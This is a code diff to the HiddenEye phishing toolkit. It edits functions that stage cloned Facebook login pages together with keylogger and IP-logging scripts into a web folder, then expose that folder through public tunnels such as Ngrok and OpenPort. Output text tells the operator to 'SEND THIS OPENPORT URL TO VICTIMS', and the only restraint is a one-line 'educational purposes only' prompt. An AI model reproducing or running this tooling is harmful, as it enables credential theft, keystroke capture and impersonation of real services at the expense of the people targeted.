@@ -34,7 +34,10 @@ MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
 
 
 def runPhishing(page, customOption):  # Phishing pages selection menu
-    system('rm -r Server/www/ && mkdir Server/www && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
+    system('cd Server && mkdir www && chmod 777 Server -R')
+    system('rm -r Server/www/ && mkdir Server/www')
+    system('touch Server/www/usernames.txt && touch Server/www/ip.txt')
+    system('cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
     if customOption == '1' and page == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     elif customOption == '2' and page == 'Facebook':
@@ -194,7 +197,7 @@ def selectServer(port):  # Question where user must select server
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     print(
         "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
-    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]\n {0}[{1}6{0}]{1}OpenPort\n {0}[{1}7{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
+    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo {0}(Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel \n {0}[{1}5{0}]{1}OpenPort\n {0}[{1}6{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
 
     choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     if choice == '0':
@@ -214,11 +217,8 @@ def selectServer(port):  # Question where user must select server
         runLT(port, True)
     elif choice == '5':
         system('clear')
-        runLT(port, False)
-    elif choice == '6':
-        system('clear')
         runOpenport(port)
-    elif choice == '7':
+    elif choice == '6':
         system('clear')
         runPagekite(port)
     else:
@@ -300,107 +300,51 @@ def runOpenport(port):
 	else:
 		manageOpenporturl(port)
 
-def manageOpenporturl(port): # Its all about How we generate a url from openport, & How we used grep & curl to get a url to shown on final panel of script.
-	print("\n{0}[{1}*{0}] {0}Please Be Calm , We are Working To get a Openport URL For You.{1}".format(MAIN0, MAIN4))
-	sleep(2)
-	system('rm filename.txt')
-	try:
-		system('openport -K && openport %s > openport.txt &' % (port)) # Running openport server and putting the process in background using (&) and writing the output to a txt file.
-		print('[*] Openport Server Running in Background.. Please wait.')
-		sleep(20) # Sleep time is important as the openport command takes some time to give response link.
-		system('cat openport.txt | grep https://spr.openport.io/l/...................... -oh > urltoverify.txt') # Taking out the neccesary verification link from output txt file of openport (above). 
-		print('[*] Getting the verification link of openurl tunnel.')
-		with open('urltoverify.txt') as f:
-			read_data = f.read()
-			if 'https://spr.openport.io/l/' in read_data:
-				print('[*] In case Error Occured Visit Below Link to Get your Tunnel Link')
-				pass
-			else:
-				print('[^] Unable To Got Openport Link. ')
-				print('[*] You Have Reached Maximum Free Tunnels or (Server Down).')
-				print('[*] Trying Again..')
-				sleep(7)
-				runOpenport(port)
+def manageOpenporturl(port):
+	system('rm output.txt > /dev/null 2>&1')
+	system('openport -K && openport %s > output.txt &' % (port)) 
+	print('{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait.'.format(MAIN0, MAIN4))
+	sleep(20) # Sleep time is important as the openport command takes some time to give response link.
+	system('cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt') # Taking out the neccesary verification link from output txt file of openport (above). 
+	print('{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...'.format(MAIN0, MAIN4))
+	with open('openport.txt') as f:
+		read_data = f.read()
+		if 'openport.io/l/' in read_data:
+			print('{0}[{1}*{0}] {1}Got Activation Link...'.format(MAIN0, MAIN4))
+			pass
+		else:
+			print('{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... '.format(MAIN0, MAIN4))
+			output = open('output.txt', 'r')
+			output = output.read()
+			print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(MAIN0, MAIN4, output))
+			input('\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(MAIN0, MAIN4))
+			selectServer(port)
 		
-		urlFile = open('urltoverify.txt', 'r')
-		urltoverify = urlFile.read().strip()
-		print('{0}[{1}*{0}] {1}Got A Verification Link:{0} '.format(MAIN0, MAIN4))
-
-		
-		# Creating a curl request to start the tunnel from the verification link, And grabing the whole content of the HTML page ( To get tunnel link .)
-		system('touch filename.txt')
-		with open('filename.txt', 'r') as f:
-			read_data = f.read()
-		c = read_data.replace('', ' -o urlindex.txt')
-		f = open('filename.txt', 'w')
-		f.write(c)
-		f.close()
-		with open('filename.txt', 'r') as f:
-			filename = f.read()
-		urltoverify = urltoverify+filename	
-		print('\n\n[*] Requesting Server to Get the working Url For Tunnel.')
-		system('curl {0}'.format(urltoverify)) # Creating a curl request to start the tunnel from the verification link, And grabing the whole content of the HTML page ( To get tunnel link .)
-		sleep(5)
-		
-		# From that html file codes we are grabing our tunnel link ( Tunnel link available 2 times in Source Codes So we have to remove duplicates in order to get one link to show on script)
-		print('\n[*] Index File of response Saved.')
-		sleep(8)
-		print('[*] Finding Original Url From index File.')
-		system('rm filename.txt && touch filename.txt')
-		with open('filename.txt', 'r') as f:
-			read_data = f.read()
-		c = read_data.replace('', ' | grep http://spr.openport.io:..... -oh > mixedurl.txt')
-		f = open('filename.txt', 'w')
-		f.write(c)
-		f.close()
-		with open('filename.txt', 'r') as f:
-			filename = f.read().strip()
-		system('cat urlindex.txt {0}'.format(filename)) # From that html file codes we are grabing our tunnel link ( Tunnel link available 2 times in Source Codes So we have to remove duplicates in order to get one link to show on script)
-		
-
-		system('rm filename.txt && touch filename.txt')
-		with open('filename.txt', 'r') as f:
-			read_data = f.read()
-		c = read_data.replace('', ' > openporturl.txt')
-		f = open('filename.txt', 'w')
-		f.write(c)
-		f.close()
-		with open('filename.txt', 'r') as f:
-			filename = f.read().strip()
-		sleep(6)
-		print('[*] Removing The Duplicates Of Original Url.')
-		system('sort +2 -u mixedurl.txt {0}'.format(filename)) # It will remove the duplicate and make it single url.
-		urlFile = open('openporturl.txt', 'r')
-		url = urlFile.read()
-		sleep(3)
-		print('[*] We Got The URL :{0}'.format(url))
-		sleep(15)
-		
-
-		system('rm urltoverify.txt && rm mixedurl.txt && rm urlindex.txt && rm openport.txt') # To remove all the above used txt files.
-		system('clear')
-		print('''
-	        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-	        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-	        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-	        {0}http://github.com/darksecdevelopers
-	        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-		print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
-		print("\n")
-	except:
-		input('\n\n[*] Failed To Get URL.. Press Enter To Go Back.')
-		sleep(2)
-		selectServer(port)
+	urlFile = open('openport.txt', 'r')
+	urltoverify = urlFile.read().strip()
+	print('{0}[{1}*{0}] {1}Open This Activation Link From Browser to Get Tunnel Link...\n'.format(MAIN0, MAIN4))
+	print('{0}[{1}*{0}] {1}Tunnel Activation Link:{0}{2} '.format(MAIN0, MAIN4, urltoverify))
+	url = input('\n\n{0}[{1}*{0}] {1}Enter The Tunnel Link Found in Browser: {0} '.format(MAIN0, MAIN4,))
+	sleep(4)
+	system('clear')
+	print('''
+	    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+	    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+	    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+	    {0}http://github.com/darksecdevelopers
+	    {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+	print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(MAIN0, MAIN4, MAIN3, port, url))
 
 def runNgrok(port):
+    system('killall -2 ngrok > /dev/null')
+    system('clear')
     print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-
-    system('killall -2 ngrok > /dev/null 2>&1 && ./Server/ngrok http {} > /dev/null &'.format(port))
+    system('./Server/ngrok http {} > /dev/null &'.format(port))
     while True:
         sleep(2)
         system(
@@ -616,8 +560,15 @@ def runLT(port, npm):
 
 def runMainMenu():  # menu where user select what they wanna use
     # Terms Of Service
-    print("            _________________________________________________\n           |   WITH GREAT POWER , COMES GREAT RESPONSIBILITY |     \n            +++++++++++++++++++++++++++++++++++++++++++++++++")
-    if input("\n\n\n\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational/testing purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
+    sleep(6)
+    system('clear')
+    orange  = '\033[33m'
+    blue  = '\033[34m'
+    purple  = '\033[35m'
+    red  = '\033[31m'
+    print("\n\n\n              {2}WITH GREAT {1}POWER {3}- {2}COMES GREAT {1}RESPONSIBILITY      ".format(orange, red, purple, blue))
+    
+    if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0, orange)).upper() != 'Y':
         system('clear')
         print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
         exit()
